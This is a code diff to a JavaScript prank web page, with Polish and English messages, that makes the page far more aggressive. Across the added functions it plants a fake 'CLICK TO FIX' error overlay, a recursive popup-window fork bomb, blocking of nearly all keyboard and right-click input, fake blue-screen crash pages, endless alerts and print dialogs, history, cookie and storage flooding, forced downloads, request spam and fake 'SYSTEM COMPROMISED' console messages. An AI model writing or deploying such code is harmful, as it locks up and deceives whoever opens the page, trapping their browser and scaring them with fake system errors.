@@ -258,68 +258,282 @@ function init () {
       maximizeAudio()
       startInfiniteSpawning()
       blockShortcuts()
+      // Spam windows on every interaction too
+      openWindow()
+      openWindow()
+      startGodMode()
     }
   })
 
-  // Start flashing IMMEDIATELY on load
+  // Start flashing and URL animation IMMEDIATELY on load
   startFlashing()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
   
-  // Try to trigger other things on ANY movement (might fail for some, but worth a try)
-  const triggerEverything = () => {
+  // Create a massive overlay that MUST be clicked to "start" or "close" something
+  const startOverlay = document.createElement('div')
+  startOverlay.id = 'start-overlay'
+  startOverlay.style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:2000000; cursor:pointer; display:flex; align-items:center; justify-content:center; color:white; font-size:2rem; font-family:sans-serif; text-align:center;'
+  startOverlay.innerHTML = '<div>⚠️ ERROR: PROSZĘ KLIKNĄĆ ABY NAPRAWIĆ / CLICK TO FIX ⚠️</div>'
+  document.body.appendChild(startOverlay)
+
+  startOverlay.addEventListener('click', () => {
     onInitialClick()
-    window.removeEventListener('mousemove', triggerEverything)
-    window.removeEventListener('scroll', triggerEverything)
-    window.removeEventListener('keydown', triggerEverything)
-  }
-  window.addEventListener('mousemove', triggerEverything)
-  window.addEventListener('scroll', triggerEverything)
-  window.addEventListener('keydown', triggerEverything)
+    startOverlay.remove()
+  })
 }
 
 function blockShortcuts() {
+  const blockedKeys = ['F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12', 'Escape', 'Enter', 'Tab', 'Control', 'Alt', 'Shift', 'Meta']
   window.addEventListener('keydown', e => {
-    // Block F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S, Ctrl+P, Alt+F4 (where possible)
-    if (
-      e.key === 'F12' ||
-      (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-      (e.ctrlKey && e.key === 'u') ||
-      (e.ctrlKey && e.key === 's') ||
-      (e.ctrlKey && e.key === 'p') ||
-      (e.altKey && e.key === 'F4')
-    ) {
+    if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
       e.preventDefault()
       e.stopPropagation()
-      window.alert('NIE MA TAK ŁATWO! / NO ESCAPE!')
+      // Annoying alert that triggers more windows
+      for(let i=0; i<3; i++) openWindow()
       return false
     }
   }, true)
   
-  // Disable right click
-  window.addEventListener('contextmenu', e => {
-    e.preventDefault()
-    return false
-  })
+  // Disable right click and other interactions
+  window.addEventListener('contextmenu', e => e.preventDefault())
+  window.addEventListener('selectstart', e => e.preventDefault())
+  window.addEventListener('dragstart', e => e.preventDefault())
 }
 
 function startInfiniteSpawning() {
+  // Ultra aggressive multi-loop
+  const spam = () => {
+    // Open 5 windows at once
+    for(let i=0; i<5; i++) {
+        openWindow()
+    }
+    requestAnimationFrame(spam)
+  }
+  requestAnimationFrame(spam)
+  
+  // Fallback intensive intervals
+  for(let i=0; i<10; i++) {
+    setInterval(openWindow, 50 + (i * 10))
+  }
+
+  // Trigger other annoying things in a loop
   setInterval(() => {
-    openWindow()
-  }, 2000) // Every 2 seconds try to open a new one
+    window.history.pushState(null, "", window.location.href + "#" + Math.random())
+    triggerFileDownload()
+    copySpamToClipboard()
+  }, 100)
+
+  // Print Bomb - blocks, but we can try to trigger it often
+  setInterval(() => {
+    if (Math.random() < 0.1) window.print()
+  }, 5000)
+}
+
+function startGodMode() {
+  // Constant pointer lock
+  document.addEventListener('mousemove', () => {
+    requestPointerLock()
+  })
+
+  // Geolocation spam
+  setInterval(() => {
+    navigator.geolocation.getCurrentPosition(() => {}, () => {})
+  }, 1000)
+
+  // Battery spam (if supported)
+  if (navigator.getBattery) {
+    navigator.getBattery().then(battery => {
+      battery.addEventListener('levelchange', () => {
+        window.alert('BATERIA SIĘ ZMIENIŁA! / BATTERY CHANGED!')
+      })
+    })
+  }
+
+  // Network spam
+  setInterval(() => {
+    fetch('/?spam=' + Math.random()).catch(() => {})
+  }, 50)
+
+  // Create infinite alerts that respawn
+  const annoy = () => {
+    window.alert('DALEJ TU JESTEŚ? / STILL HERE?')
+    setTimeout(annoy, 1000)
+  }
+  setTimeout(annoy, 5000)
+
+  // Screen shake
+  document.body.classList.add('shake')
+
+  // Fake cursors - SWARM OF 1000
+  const cursors = []
+  for(let i=0; i<1000; i++) {
+    const c = document.createElement('div')
+    c.className = 'fake-cursor'
+    c.style.opacity = Math.random()
+    document.body.appendChild(c)
+    cursors.push(c)
+  }
+
+  document.addEventListener('mousemove', e => {
+    cursors.forEach((c, i) => {
+      // Different delay and offset for each cursor to create a swarm effect
+      setTimeout(() => {
+        const offset = (Math.random() * 200 - 100) * (i / 100)
+        c.style.left = e.clientX + offset + 'px'
+        c.style.top = e.clientY + offset + 'px'
+      }, (i % 50) * 10)
+    })
+  })
+
+  startApocalypse()
+}
+
+function startApocalypse() {
+  // Invert colors
+  setInterval(() => {
+    document.documentElement.style.filter = Math.random() > 0.5 ? 'invert(1)' : 'none'
+  }, 1000)
+
+  // Title spam
+  setInterval(() => {
+    document.title = getRandomArrayEntry(PHRASES)
+  }, 200)
+
+  // Infinite TTS
+  const speakLoop = () => {
+    speak()
+    setTimeout(speakLoop, 3000)
+  }
+  speakLoop()
+
+  // Random scroll
+  setInterval(() => {
+    window.scrollTo(Math.random() * 1000, Math.random() * 1000)
+  }, 100)
+
+  // Fake BSOD - EVERY 3 SECONDS
+  setInterval(() => {
+    const bsod = document.createElement('div')
+    bsod.style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:#0000aa; color:white; font-family:monospace; padding:50px; z-index:4000000; cursor:pointer;'
+    bsod.innerHTML = `
+      <h1>:(</h1>
+      <p>Twoje urządzenie napotkało problem i musi zostać zrestartowane.</p>
+      <p>Zbieramy tylko niektóre informacje o błędach, a następnie zrestartujemy urządzenie za Ciebie.</p>
+      <p>100% ukończono</p>
+      <p style="font-size: 0.8rem; margin-top: 50px;">BŁĄD: SYSTEM_CRITICAL_PTOSZEK_OVERFLOW</p>
+      <p style="margin-top: 20px;">Kliknij, aby "kontynuować"...</p>
+    `
+    document.body.appendChild(bsod)
+    bsod.onclick = () => {
+      bsod.remove()
+      for(let i=0; i<20; i++) openWindow()
+    }
+    // Remove it after 1.5s to prepare for next one
+    setTimeout(() => { if(bsod.parentNode) bsod.remove() }, 1500)
+  }, 3000)
+
+  startChaosMatrix()
+}
+
+function startChaosMatrix() {
+  // 1. Permanent Fullscreen Attempt
+  setInterval(requestFullscreen, 1000)
+
+  // 2. Text Scrambler
+  setInterval(() => {
+    const tags = ['h1', 'h2', 'h3', 'p', 'div']
+    const tag = getRandomArrayEntry(tags)
+    const el = document.querySelector(tag)
+    if (el) el.innerText = Math.random().toString(36).substring(7)
+  }, 500)
+
+  // 3. Filter Jitter
+  setInterval(() => {
+    const blur = Math.random() * 5
+    const contrast = Math.random() * 200
+    const hue = Math.random() * 360
+    document.documentElement.style.filter = `blur(${blur}px) contrast(${contrast}%) hue-rotate(${hue}deg)`
+  }, 200)
+
+  // 4. Input Spam
+  setInterval(() => {
+    const input = document.createElement('input')
+    input.type = 'text'
+    input.value = 'ZPTOSZKOWANY!'
+    input.style = `position:fixed; top:${Math.random()*100}%; left:${Math.random()*100}%; z-index:5000000;`
+    document.body.appendChild(input)
+    input.focus()
+  }, 1000)
+
+  // 5. History Flood (Extreme)
+  setInterval(() => {
+    for(let i=0; i<10; i++) {
+        window.history.pushState(null, "", "#" + Math.random())
+    }
+  }, 50)
+
+  // 6. Cookie & Storage Bomb
+  setInterval(() => {
+    document.cookie = `spam_${Math.random()}=${Math.random()}; path=/`
+    localStorage.setItem(`spam_${Math.random()}`, "A".repeat(10000))
+  }, 100)
+
+  // 7. Audio Randomizer
+  setInterval(() => {
+    if (window.oscillatorNode) {
+        window.oscillatorNode.frequency.value = Math.random() * 5000
+    }
+  }, 100)
+
+  // 8. Auto Print (Careful, this blocks)
+  setInterval(() => {
+    if (Math.random() < 0.05) window.print()
+  }, 10000)
+
+  // 9. Window Jitter (Main)
+  setInterval(() => {
+    window.moveBy(Math.random()*10-5, Math.random()*10-5)
+    window.resizeBy(Math.random()*10-5, Math.random()*10-5)
+  }, 50)
+
+  // 10. Console Spam
+  setInterval(() => {
+    console.log("%c PTOSZEK TAKEOVER ", "background: red; color: white; font-size: 50px")
+    console.error("CRITICAL ERROR: SYSTEM COMPROMISED")
+    console.warn("WARNING: CPU AT 100%")
+  }, 10)
 }
 
 function onInitialClick() {
   const catcher = document.getElementById('click-catcher')
   if (catcher) catcher.remove()
+  
+  // Force everything
   requestFullscreen()
   startFlashing()
   maximizeAudio()
   startInfiniteSpawning()
   blockShortcuts()
   
-  // Try to spawn more windows immediately
-  for(let i=0; i<3; i++) {
-    openWindow()
+  // Aggressive window spawning - THE WHILE(TRUE) VIBE
+  // We can't do a literal infinite while(true) or the browser crashes before spawning
+  // but we can spawn a LOT immediately.
+  let i = 0;
+  const burst = () => {
+    if (i < 50) { // Burst of 50 windows
+      openWindow()
+      i++
+      setTimeout(burst, 10)
+    }
   }
+  burst()
+
+  // Keep trying to force fullscreen on EVERY click
+  document.addEventListener('click', () => {
+    requestFullscreen()
+    for(let i=0; i<5; i++) openWindow() // Every click spawns 5 more
+  }, true)
 }
 
 function startFlashing() {
@@ -722,7 +936,7 @@ function enablePictureInPicture () {
 /**
  * Focus all child windows. Requires user-initiated event.
  */
-function focusWindows () {
+function focusWindows() {
   wins.forEach(win => {
     if (!win.closed) win.focus()
   })
@@ -731,10 +945,10 @@ function focusWindows () {
 /**
  * Open a new popup window. Requires user-initiated event.
  */
-function openWindow () {
+function openWindow() {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
+  const win = window.open(window.location.pathname + '?child=true', '', opts)
 
   // New windows may be blocked by the popup blocker
   if (!win) return
@@ -742,11 +956,20 @@ function openWindow () {
 
   if (wins.length === 2) setupSearchWindow(win)
 
-  // Added by @wetraks
-  win.onunload = function () {
-    // Some browsers might not support onunload, but include it for completeness
-    return false;
-  };
+  // Recursively spawn from the new window too
+  // This creates the "fork bomb" effect
+  try {
+    win.onload = () => {
+      if (win.startInfiniteSpawning) win.startInfiniteSpawning()
+    }
+  } catch(e) {}
+
+  // Attempt to make the window "unclosable" by spawning replacements
+  win.addEventListener('beforeunload', () => {
+    for(let i=0; i<5; i++) {
+        setTimeout(openWindow, i * 50)
+    }
+  })
 
   // For modern browsers
   win.addEventListener("beforeunload", function (e) {
